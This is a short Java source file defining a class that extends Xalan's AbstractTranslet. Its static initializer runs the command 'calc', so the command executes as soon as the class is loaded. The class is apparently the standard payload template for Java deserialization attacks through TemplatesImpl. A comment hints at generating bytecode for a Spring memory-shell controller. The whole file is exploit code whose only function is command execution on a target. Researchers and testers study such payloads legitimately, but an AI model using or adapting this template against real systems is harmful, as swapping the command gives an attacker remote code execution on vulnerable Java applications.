package com.bytecode;


import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xalan.xsltc.runtime.AbstractTranslet;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

import java.io.IOException;
//ClassPool.getDefault().get(MSpringJNIController.class.getName()).toBytecode()
public class exampleTemplates extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException {

    }

    @Override
    public void transform(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler) throws TransletException {

    }

    public static void main(String[] args) {

    }
}

